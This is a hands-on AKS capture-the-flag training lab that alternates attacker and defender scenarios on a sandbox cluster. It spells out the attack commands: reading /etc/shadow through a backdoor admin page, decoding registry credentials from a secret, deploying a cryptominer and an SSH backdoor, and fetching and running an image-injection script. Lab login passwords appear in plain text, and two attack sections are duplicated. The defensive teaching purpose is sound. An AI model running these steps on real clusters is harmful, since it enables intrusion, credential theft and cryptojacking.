Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 59 Min Remaining 
Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
Welcome to Your Lab Environment
To begin, log into the virtual machine using the following credentials: Pa$$w0rd

Close down any dialog such as Microsoft system prompts or notifications related to backup/OneDrive.

Note: Text formatted as an example represents type text. Clicking on this text will automatically insert it to prevent any typing errors.

AKS Capture the Flag
Welcome to Ethical Hacking with AKS: Hands-On Attack and Defense Strategies.

This lab is customized for the Skillable environment from AKS CTF and inspired by Secure Kubernetes.

We'll help you create your own AKS cluster so you can follow along as we take on the role of two personas:

a malicious attacker looking to make some money
and the overworked admin, working hard to keep the cluster safe and healthy.
When you're ready, click "Next: Setup" below.

Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 48 Min Remaining 
Setup
Open Terminal from the Windows taskbar and wait for the prompt.

Type az login --use-device-code

Copy the code and in the browser, go to https://microsoft.com/devicelogin

Use the username and password (also available in the Resources tab)

User1-51505140@LODSPRODMCA.onmicrosoft.com
Sr0Je2!!Da
Follow the prompts in the browser until you see the message:

You have signed in to the Microsoft Azure Cross-platform Command Line Interface application on your device. You may now close this window.

Return to the terminal window.

When prompted to enter the subscription, just hit Enter

In the shell, run the following to clone the repo and setup the environment variables needed for the lab:

git clone https://github.com/azure/aks-ctf.git
cd aks-ctf/workshop
export RESOURCE_GROUP=ResourceGroup1
export AKS_NAME=aks51505140
export ACR_NAME=acr51505140
Because the resource might still be deploying from the lab startup, wait until the AKS cluster is up and running to start the next step:

az aks show -g $RESOURCE_GROUP -n $AKS_NAME -o tsv --query 'provisioningState'
When the above command returns "Succeeded", you are ready to run the rest of the setup script.

If the command does not return "Succeeded", wait a minute and retry. If after 5-10 minutes it still does not return "Succeeded", see the proctor.

Run the setup script to deploy the initial application

./setup-build-2025.sh
The above command takes about 1-2 minutes.

When the command completes, verify that the application has deployed successfully:

kubectl get pods --namespace dev
The output should look similar to this:

NAME                           READY   STATUS    RESTARTS   AGE
insecure-app-674cf64dd-qf7md   1/1     Running   0          63m
The name of your pod will be slightly different. What's important is that the pod status says "Running". If your pod is running, move on to Scenario 1 Attack.

Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 39 Min Remaining 
Scenario 1 Attack (Free Compute)
Warning: In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.

In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.

Backstory
Name: Red
Opportunist
Easy money via crypto-mining
Uses automated scans of web IP space looking for known exploits and vulnerabilities
Motivations
Red has been mining "bitcoinero" (a fake cryptocurrency) for a few months now, and it's starting to gain some value
Red is looking for "free-to-them" compute on which to run miners
Red purchased some leaked credentials from the dark web
Thinking In Graphs
Attacking a system is a problem-solving process similar to troubleshooting: Red begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.

The general process looks like this:

attack lifecycle

Study

In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, "nmap" is commonly used to enumerate IP networks. "nikto", "burp", and "sqlmap" are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as "uname", "winver", and "netstat" provide a wealth of information about their host OSes.

Plan

In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack Something. Otherwise, go back to Study and try to learn more.

Attack Something

In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.

Persist

In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.

Win

Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.

Getting Access
Red team found an app online and ran a dictionary attack against it. Some valid paths were "/crash" and "/admin". Let's try to find an exploit!

To find the compromised website, in Terminal run the following:

./scenario_1/attack-1-helper.sh
This is a message from the team that provided the leaked credentials. Inside, you see 3 links.

In your browser, go to the first URL provided (e.g. "http://HACKED_IP:8080/")
CTRL+Right-Click will open links from the terminal in your current browser window

Hmm. "Nothing to see here."? They're probably wrong.

Try the Admin page: "http://HACKED_IP:8080/admin".
aks-ctf-admin-1.png

Hmm. It's asking for credentials. Since it was a browser popup (instead of an in-app request), it probably uses Basic Auth.

Try the Crash page: "http://HACKED_IP:8080/crash"
aks-ctf-crash.png

Looks like we've crashed the app! And it prints out all of the environment variables. Oh goodie! There's two values that seem to be especially interesting (AUTH_USERNAME and AUTH_PASSWORD). Let's go back to the Admin page and try those.

Open the Admin page ("http://HACKED_IP:8080/admin") in a new tab and enter the credentials from the crash page.
And we're in! Looks like Frank left a backdoor to run some commands. Let's see what we can learn:

aks-ctf-admin-2.png

Click into the "Run a command" textbox in the hacked admin page and then try each of the commands below:

id
uname -a
cat /etc/os-release
ps -ef
There are very few processes running. This is probably a container.

df -h
cat /etc/shadow
ls -l /
ls -l $PWD
echo $PATH
Can we add files to the default PATH?

touch /usr/local/bin/foo && ls /usr/local/bin/
It looks like we can.

Now let's inspect our environment:

env
This tells us several things:

We are in a container
It's managed by Kubernetes
Let's poke around some more and see if we can find any credentials.

ls /var/run/secrets/kubernetes.io/serviceaccount
Deploy Bitcoin miner + backdoor
We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:

This may take a minute or two. Watch the page progress in the browser tab.

cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl; kubectl version
kubectl get all
What workloads are deployed in all of the namespaces?

kubectl get all -A
What operations can I run on this cluster?

kubectl auth can-i --list
Can I create pods?

kubectl auth can-i create pods
It looks like we have hit the jackpot! Let's see if we can start mining some crypto.

kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml; sleep 10; kubectl get pods -n dev
We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.

kubectl apply -n kube-system -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/backdoor.yaml
Wait ~10 seconds for the Public IP to be exposed

kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'
Our Bitcoin miner is now deployed and we've also deployed an SSH backdoor. Mission Accomplished.


Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 34 Min Remaining 
Scenario 1 Defense (Free Compute)
Backstory
Name: Blue
Overworked
Can only do the bare minimum
Uses defaults when configuring systems
Usually gets blamed for stability or security issues
Has no experience operating Kubernetes clusters
Motivations
Blue gets paged at 1am with an "urgent" problem: the developers say "the website is slow"
Blue reluctantly agrees to take a "quick look"
Blue wants desperately to get back to sleep. Zzz
Defense
Blue looks at the page with an unsurprising lack of details, and spends a few minutes getting the answer to exactly which website they are referring to that is underperforming. It's "the one running in Kubernetes", they said. Blue leverages their terminal to begin the process of troubleshooting the issue.

Identifying the Issue
The first step is to determine the name for the web application deployment in question.

Open a new terminal Tab (click the '+' in the top menu bar). This tab will represent the Blue team. To make it easier to keep track of which tab is which, right click on the tab and select 'Change Tab Color'. Select blue for the current tab and red for the other tab.



Run the following to create the environment variables and see all pods in the AKS namespace:

export RESOURCE_GROUP=ResourceGroup1
export AKS_NAME=aks51505140
export ACR_NAME=acr51505140
kubectl get pods --all-namespaces
The cluster is relatively small in size, but it has a couple deployments that could be the site in question. The development team mentions performance is an issue, so Blue checks the current CPU and Memory usage with:

kubectl top node
and

kubectl top pod --all-namespaces
It appears that a suspcious deployment named bitcoinero is running, and its causing resource contention issues. Blue runs the following to see the pod's full configuration:

kubectl get deployment -n dev bitcoinero -o yaml
It was created very recently, but there are no ports listening, so this looks unlikely to be part of the website. Next, Blue grabs a consolidated listing of all images running in the cluster:

kubectl get pods --all-namespaces -o jsonpath="{..image}" | tr -s '[[:space:]]' '\n' | sort -u
Confirming the Foreign Workload
Blue sends a message back to the developers asking for confirmation of the suspicious bitcoinero image, and they all agree they don't know who created the deployment. Blue looks at the audit logs for the AKS cluster.

In the Azure Portal, open up Log Analytics:

In a new browser window, go to https://portal.azure.com
Use the username and password (also available in the Resources tab)
User1-51505140@LODSPRODMCA.onmicrosoft.com
Sr0Je2!!Da
In the Portal search bar, search for Log Analytics workspaces, select it and hit Enter
Click on the "aksctf" workspace
Click "Logs"
Click the 'X' to close any dialog box. If you still see the 'Queries Hub' and not the query area, you may need to click 'X' again to fully close the 'Queries Hub'.
Change from "Simple Mode" to "KQL Mode" (If prompted, set to default) Log Analytics with KQL Mode
In the query section, paste in this query to see the AKS Audit Logs for the bitcoinero container

AKSAuditAdmin
| where RequestUri startswith "/apis/apps/v1/namespaces/dev/" 
    and Verb == "create" 
    and ObjectRef contains "bitcoinero"
| project User, SourceIps, UserAgent, ObjectRef, TimeGenerated
Hit the "Run" button

Audit logs showing the bitcoinero deployment was created from command line by someone with admin credentials

Blue sees that the bitcoinero deployment was created by the cluster admin using the kubectl commandline interface. The IP addresses also show that whoever this was connected from outside the company network.

Cleaning Up
Unsure of exactly who created the bitcoinero deployment, Blue decides that it's now 3am, and the commands are blurring together. The website is still slow, so Blue decides to delete the deployment:

In the Blue Team terminal tab, type:

kubectl get deployments -n dev
kubectl delete deployment bitcoinero -n dev
Stopping further intrusions
Blue remembers that when deploying the AKS cluster they had the option to specify what IP addresses are allowed to connect to the public API server of the cluster. Perhaps now is the time to implement that feature. Let's make sure that the API server will only accept connections from Blue's IP as well as any ip within the corporate network:

MY_PUBLIC_IP=$(curl -s ifconfig.me)
az aks update -n $AKS_NAME -g $RESOURCE_GROUP \
    --api-server-authorized-ip-ranges $MY_PUBLIC_IP/32
The above command takes about 3-5 minutes.

Giving the "All Clear"
Seeing what looks like a "happy" cluster, Blue emails their boss that there was a workload using too many resources that wasn't actually needed, so it was deleted. Also, they added some additional "security" just in case.


Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 30 Min Remaining 
Scenario 2 Attack (Persistence)
Backstory
Name: Red
Opportunist
Easy money via crypto-mining
Uses automated scans of web IP space looking for known exploits and vulnerabilities
Motivations
Red notices that public access to the cluster is gone and the cryptominers have stopped reporting in
Red is excited to discover that the SSH server they left behind is still active
Re-establishing a Foothold
Red reconnects to the cluster using the SSH service disguised as a metrics-server on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:

There is a service account associated with the container which has been granted access to all kubernetes APIs
The container is running with a privileged security context which grants it direct access to the host OS
Deploying Miners via the back door
You will need the SSH server IP address that was deployed in the previous attack. You can fetch it again in the hacked app by running:

Use the Red Team terminal tab

SSH_SERVER_IP=$(kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
echo $SSH_SERVER_IP
Now login to the SSH server:

ssh root@$SSH_SERVER_IP -p 8080 -o StrictHostKeyChecking=no
The Password is:

Sup3r_S3cr3t_P@ssw0rd
Let's re-download kubectl and create our miner:

apk update
apk add curl
cd /usr/local/bin
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 555 kubectl
export KUBERNETES_SERVICE_HOST=kubernetes.default.svc
export KUBERNETES_SERVICE_PORT=443
kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml
Verify that the pod is running:

kubectl get pods -n dev
The output should look something like this:

NAME                           READY   STATUS    RESTARTS   AGE
bitcoinero-6b95755447-cttkz    1/1     Running   0          23s
insecure-app-66dffb686-tp46w   1/1     Running   0          24m
Time for some celebratory pizza! Go ahead and logout of the ssh session.

exit

Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 25 Min Remaining 
Scenario 2 Attack (Persistence)
Backstory
Name: Red
Opportunist
Easy money via crypto-mining
Uses automated scans of web IP space looking for known exploits and vulnerabilities
Motivations
Red notices that public access to the cluster is gone and the cryptominers have stopped reporting in
Red is excited to discover that the SSH server they left behind is still active
Re-establishing a Foothold
Red reconnects to the cluster using the SSH service disguised as a metrics-server on the cluster. While having access to an individual container may not seem like much of a risk at first glance, this container has two characteristics that make it very dangerous:

There is a service account associated with the container which has been granted access to all kubernetes APIs
The container is running with a privileged security context which grants it direct access to the host OS
Deploying Miners via the back door
You will need the SSH server IP address that was deployed in the previous attack. You can fetch it again in the hacked app by running:

Use the Red Team terminal tab

SSH_SERVER_IP=$(kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
echo $SSH_SERVER_IP
Now login to the SSH server:

ssh root@$SSH_SERVER_IP -p 8080 -o StrictHostKeyChecking=no
The Password is:

Sup3r_S3cr3t_P@ssw0rd
Let's re-download kubectl and create our miner:

apk update
apk add curl
cd /usr/local/bin
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod 555 kubectl
export KUBERNETES_SERVICE_HOST=kubernetes.default.svc
export KUBERNETES_SERVICE_PORT=443
kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml
Verify that the pod is running:

kubectl get pods -n dev
The output should look something like this:

NAME                           READY   STATUS    RESTARTS   AGE
bitcoinero-6b95755447-cttkz    1/1     Running   0          23s
insecure-app-66dffb686-tp46w   1/1     Running   0          24m
Time for some celebratory pizza! Go ahead and logout of the ssh session.

exit

Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 25 Min Remaining 
Scenario 2 Defense (Persistence)
Backstory
Name: Blue
Still overworked
Still can only do the bare minimum
Uses the defaults when configuring systems
Usually gets blamed for stability or security issues
Motivations
A week after the first incident, Blue gets paged at 3am because "the website is slow again".
Blue, puzzled, takes another look.
Blue decides to dust off the résumé "just in case".
Defense
Blue is paged again with the same message as last time. What is going on? Could this be the same problem again?

Identifying the Issue
All commands for this page are run in the Blue Team Terminal Tab

Let's run some basic checks again to see if we can find random workloads.

kubectl get pods --all-namespaces
It's back! But how? Let's check the audit logs again:

AKSAuditAdmin
| where RequestUri startswith "/apis/apps/v1/namespaces/dev/deployments" 
    and Verb == "create" 
    and ObjectRef contains "bitcoinero"
| project User, SourceIps, UserAgent, ObjectRef, TimeGenerated
Audit logs showing the bitcoinero deployment was created by the metrics-server-account

How did a service account associated with the metrics-server create a deployment? And what is that sourceIP, it looks familiar…

Let's fetch the public egress IP address for the cluster API server. First start a pod we can use to curl out of the cluster:

kubectl run curl --rm -it --image=alpine/curl -- sh
From within the pod, fetch the cluster egress ip from an external ip echo service:

curl icanhazip.com
exit
So let me get this straight… the bitcoinero deployment was created by another deployment's service account, using curl, from inside the cluster?

Blue is starting to suspect that there may be an unwanted visitor in the cluster. But how to find them? Let's start by looking for ClusterRoles with high levels of permissions:

List all ClusterRoles with unlimited access to all APIs and resource types:

kubectl get clusterrole -o json | jq '.items[] | select(.rules[]?.resources == ["*"] and .rules[]?.verbs == ["*"] and .rules[]?.verbs == ["*"]) | .metadata.name'
cluster-admin is the only role that should be in that list. What is this privileged-role that we are also seeing?

kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name == "privileged-role")'
Why would the metrics-server need such high level privileges? Let's take a closer look at that deployment.

Look at the command that is being run for the deployment. (Hint: Should a metrics server be running sshd?)

kubectl get deployment -n kube-system metrics-server-deployment -o yaml
Look at the metric-server service. (Hint: Should that be public?)

kubectl get svc -n kube-system metrics-server-service -o yaml
metrics-server is actually running an SSH server! And it's running as a privileged container! This is bad. We need to clean this up fast!

Fixing the Leak
Blue decides it is time to evict this bad actor once and for all. Let's delete all of their work:

# Service
kubectl delete service -n kube-system metrics-server-service --wait=false
# Deployment
kubectl delete deployment -n kube-system metrics-server-deployment --wait=false
# ClusterRoleBinding
kubectl delete clusterrolebinding privileged-binding
# ClusterRole
kubectl delete clusterrole privileged-role
# ServiceAccount
kubectl delete sa -n kube-system metrics-server-account
# bitcoinero
kubectl delete deployment bitcoinero -n dev --wait=false
The fire is out (for now). But clearly we need more robust security to keep the bad guys out. How can we restrict access to ensure that only trusted users can interact with the cluster control plane?

Let's enable Entra ID integration and disable local administrative accounts. This way only users who are authenticated by our Entra tenant will have access to the cluster and we can control what those user can do by managing group membership in Entra.

First we will want to create a group in Entra that contains all of the cluster admins (and make sure our account is in it so we don't get lockd out):

GROUP_NAME=AKSAdmins$RANDOM
ADMIN_GROUP=$(az ad group create --display-name "$GROUP_NAME" --mail-nickname "$GROUP_NAME" --query id -o tsv)
az ad group member add --group "$GROUP_NAME" --member-id $(az ad signed-in-user show --query id -o tsv)
Now let's enable EntraID integration and disable local accounts:

az aks update --resource-group $RESOURCE_GROUP --name $AKS_NAME \
  --enable-aad \
  --aad-admin-group-object-ids $ADMIN_GROUP \
  --disable-local-accounts
The above command takes about 8 minutes.

Finally, we need to rotate the cluster certificates in order to invalidate the existing leaked admin credentials. This will require us to authenticate against EntraID for all future cluster administration:

az aks rotate-certs --resource-group $RESOURCE_GROUP --name $AKS_NAME -y
The above command takes about 6 minutes.

We can verify that we have lost access to cluster by running any kubectl command:

kubectl get pods
To reconnect to the cluster we will need to fetch new credentials, this time backed by Entra:

az aks get-credentials --resource-group $RESOURCE_GROUP --name $AKS_NAME --overwrite-existing
kubectl get pods -A
Now, when we try to interact with the cluster, we are prompted to login with our Entra credentials.

Confident that the cluster is now running in "Fort Knox" mode, Blue decides to call it a night and head back to bed.

Another layer of security that would be a good idea to investigate here is Azure Policy. But for the purposes of this lab, we will skip it for now.

Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 25 Min Remaining 
Scenario 3 Attack (The calls are coming from inside the container!)
Red Team Update
It appears the blue team has again deleted our bitcoinero pods. It's time to get sneakier. Instead of trying to deploy new pods into their cluster, let's poke around to see if there's anything we can use.

Lets see if there are any credentials accessible.

In the hacked admin panel, run the following:

cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl
kubectl get secrets
Ooh. There's something called acr-secret. Let's dig in.

kubectl get secrets/acr-secret -o json
There's a .dockerconfigjson file in the secret that appears to be Base64 encoded

kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d - | jq
Now we're talking! It looks like they put the admin credentials for their registry in a secret. I bet we can use this to both PUSH and PULL new images to their registry.

We can use Buildah to create, pull and push container images. However, we will need escalated privledges.

Some of the other red-team members have found this neat trick from Twitter, which deploy a container that gives us full host access. Let's work with them to find a way to utilize this.

… TIME PASSES …

Good luck! They've come up with two scripts:

run-bitcoin-injector.sh - deploys a Kubernetes Job that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container
inject-image.sh - Uses Buildah to pull the current app image, inject the bitcoin miner into the image and re-publish the image under the same name
Let's go back to our admin panel and run the following:

This command may take 1-2 minutes to run. Do not refresh the browser page. Wait for the command to complete

curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_3/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
Everything has been installed. Let's kill our process and let the new image come up

kubectl delete pod $HOSTNAME
The page immediately died (which is understandable since we killed the pod). Let's reload the page and see if we were successful. Run the following command in the admin page

ps
Our moneymoneymoney process is there and running inside their container! Good luck finding that one!

Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 23 Min Remaining 
Scenario 3 Attack (The calls are coming from inside the container!)
Red Team Update
It appears the blue team has again deleted our bitcoinero pods. It's time to get sneakier. Instead of trying to deploy new pods into their cluster, let's poke around to see if there's anything we can use.

Lets see if there are any credentials accessible.

In the hacked admin panel, run the following:

cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl
kubectl get secrets
Ooh. There's something called acr-secret. Let's dig in.

kubectl get secrets/acr-secret -o json
There's a .dockerconfigjson file in the secret that appears to be Base64 encoded

kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d - | jq
Now we're talking! It looks like they put the admin credentials for their registry in a secret. I bet we can use this to both PUSH and PULL new images to their registry.

We can use Buildah to create, pull and push container images. However, we will need escalated privledges.

Some of the other red-team members have found this neat trick from Twitter, which deploy a container that gives us full host access. Let's work with them to find a way to utilize this.

… TIME PASSES …

Good luck! They've come up with two scripts:

run-bitcoin-injector.sh - deploys a Kubernetes Job that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container
inject-image.sh - Uses Buildah to pull the current app image, inject the bitcoin miner into the image and re-publish the image under the same name
Let's go back to our admin panel and run the following:

This command may take 1-2 minutes to run. Do not refresh the browser page. Wait for the command to complete

curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_3/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
Everything has been installed. Let's kill our process and let the new image come up

kubectl delete pod $HOSTNAME
The page immediately died (which is understandable since we killed the pod). Let's reload the page and see if we were successful. Run the following command in the admin page

ps
Our moneymoneymoney process is there and running inside their container! Good luck finding that one!

Ethical Hacking with AKS: Hands-On Attack and Defense Strategies
1 Hr 22 Min Remaining 
Scenario 3 Defense (The calls are coming from inside the container!)
We've gotten paged. AGAIN! Let's check the cluster.

Return to the Blue terminal tab and run the following commands.

Any unwanted open ports?

kubectl get service -A
Any unwanted pods?

kubectl get pods -A
Where's the spike coming from?

kubectl top node
What pods?

kubectl top pod -A
Wait…what is this bitcoin-injector? It's showing as completed, so it's not running anymore, so it can't be causing the problem. Did the hackers get sloppy and leave something behind? We'll check this out later because we need to stop the bleeding.

Why is our app running so hot?

kubectl get pods -n dev
POD=$(kubectl get pod -n dev -l=app=insecure-app -o json |jq '.items[0].metadata.name' -r)
echo $POD
kubectl exec -it $POD -n dev -- ps -ef
There's a foreign workload moneymoneymoney running in our app! How did this get in here?!

Let's delete the pod:

kubectl delete pod -n dev --force --grace-period=0 $POD.

But just to be sure, let's verify that process is gone.

POD=$(kubectl get pod -n dev -l=app=insecure-app -o json |jq '.items[0].metadata.name' -r)
kubectl exec -it $POD -n dev -- ps -ef
This…is not good. The miner is running inside the app and restarting the app also restarted the miner. Is our app infected?! How could this have happened?!

Let's go re-investigate that bitcoin-injector pod:

kubectl describe pods -n dev -l job-name=bitcoin-injector
Looks like it was started as Job/bitcoin-injector.

kubectl logs -n dev -l job-name=bitcoin-injector
Looks like the output of a Docker build command…

It seems like they got our container registry credentials and then used that to push a new one with the exact same name! But how did they get that?

Let's look at the Log Analytics Audit Logs:

AKSAuditAdmin
| where RequestUri startswith "/apis/batch"
    and Verb == "create" 
| project ObjectRef, User, SourceIps, UserAgent, TimeGenerated
It appears that the request came from insecure-app. But how?

Looking at the source code, it appears there's an /admin page which Frank added this to the code years ago and was fired after that "inappropriate use of company resources" issue.

And the attackers were able to use this really permissive Service Account role binding to get escalated privledges to the cluster.

We need a plan of defense:

Delete the infected image
Stop using container registry admin credentials
Enable Defender for Containers
Downgrade/remove SA permissions (change verbs from * to GET)
Open Issue to tell developer to remove /admin page
Re-build and deploy image
Remove the infected image
Let's start by reverting the app deployment to the last known good image. Start by inspecting the image reference in the deployment manifest:

kubectl get deployment insecure-app -n dev -o=jsonpath='{.spec.template.spec.containers[*].image}'
The app team deployed by referencing the "latest" tag for their container image. This exposes their deployment to exploits like the one we just discovered. Let's update their deployment to reference a more specific tag ('1.0'):

kubectl set image deployment/insecure-app -n dev insecure-app=$ACR_NAME.azurecr.io/insecure-app:1.0
Updating the image on the deployment also has the side-effect of killing all pods currently running the infected image and relaunching them using the updated image tag.

Now let's remove the infected image from the registry:

az acr repository delete -n $ACR_NAME -t insecure-app:latest -y
Finally, since the infected insecure-app and bitcoinero images are still cached locally on the node, we need to make sure those are removed to prevent another container from starting up with the old images. Let's install the AKS Image Cleaner. This will ensure that unused images (such as the infected insecure-app and bitcoinero) are cleared from the node.

az aks update --name $AKS_NAME --resource-group $RESOURCE_GROUP  --enable-image-cleaner
Stop using container registry admin credentials
Instead of providing the ACR admin credentials, let's Attach the ACR to the cluster.

kubectl delete -n dev secrets/acr-secret
az aks update --name $AKS_NAME --resource-group $RESOURCE_GROUP --attach-acr $ACR_NAME
Enable Defender for Containers
Now that you've fixed the permissions on pulling images from ACR, you want to get alerted in case anything else gets added to our registry or the cluster.

For this, we could enable Azure Defender for Containers

The image injection would have been detected with Binary drift detection.

The binary drift detection feature alerts you when there's a difference between the workload that came from the image, and the workload running in the container. It alerts you about potential security threats by detecting unauthorized external processes within containers.

Fix container permissions
Let's look at the problematic cluster role:

kubectl describe clusterroles insecure-app-role
This shows that that this role was able to perform all "verbs" on all "resources" inside the cluster. That is WAY too permissive!

We got confirmation from the developer that the app needs to be able to see (but not modify) other pods in the namespace.

Instead of a "clusterrole" (which has access to the entire cluster), we should use a "role" (which has access to the specific namespace).

Let's delete the clusterrole and clusterolebinding and update the role to be less permissive:

kubectl delete clusterrolebinding insecure-app-binding
kubectl delete clusterrole insecure-app-role
kubectl create role pod-reader --verb=get --verb=list --verb=watch --resource=pods
kubectl create rolebinding pod-reader-binding --role=pod-reader --serviceaccount=dev:insecure-app-sa
And with that, we can now rest.

Hopefully…
